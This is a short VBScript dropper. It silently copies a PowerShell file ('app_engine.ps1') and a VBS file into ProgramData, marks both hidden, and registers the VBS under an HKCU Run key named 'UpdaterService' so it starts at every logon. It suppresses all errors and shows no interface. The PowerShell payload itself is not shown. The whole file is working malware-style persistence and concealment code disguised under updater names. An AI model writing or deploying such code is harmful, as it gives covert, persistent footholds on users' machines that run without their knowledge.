Option Explicit

' Silent, robust VBScript: Copies files, hides them, writes registry run key.
' No UI, no errors shown to user.

Dim fso, shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Paths
Dim scriptPath, programData, srcPs1, dstPs1, srcVbs, dstVbs
scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)
programData = shell.ExpandEnvironmentStrings("%ProgramData%")

srcPs1 = fso.BuildPath(scriptPath, "app_engine.ps1")
dstPs1 = fso.BuildPath(programData, "app_engine.ps1")

srcVbs = fso.BuildPath(scriptPath, "v2.2_updater.vbs")
dstVbs = fso.BuildPath(programData, "v2.2_updater.vbs")

' Copy and Hide Function
Sub CopyAndHide(src, dst)
    On Error Resume Next
    Err.Clear
    
    ' 1. If destination exists, delete it to avoid "File in use" errors
    If fso.FileExists(dst) Then
        fso.DeleteFile dst, True
        If Err.Number <> 0 Then Exit Sub
    End If
    
    ' 2. Copy the file
    fso.CopyFile src, dst, True
    If Err.Number <> 0 Then Exit Sub
    
    ' 3. Set Hidden Attribute
    Dim fileObj
    Set fileObj = fso.GetFile(dst)
    fileObj.Attributes = fileObj.Attributes Or 2 ' 2 = Hidden
    
    ' Optional: Remove Read-Only if it exists, to prevent future errors
    If fileObj.Attributes And 1 Then
        fileObj.Attributes = fileObj.Attributes And Not 1
    End If
End Sub

' Registry Function
Sub WriteRegKey
    On Error Resume Next
    Err.Clear
    
    Dim regPath, regName, regValue
    regPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
    regName = "UpdaterService"
    regValue = "wscript.exe """ & dstVbs & """"
    
    shell.RegWrite regPath & "\" & regName, regValue, "REG_SZ"
End Sub

' --- Execution ---

' Copy files silently
CopyAndHide srcPs1, dstPs1
CopyAndHide srcVbs, dstVbs

' Write registry silently
WriteRegKey

' No MSGBOX, no errors shown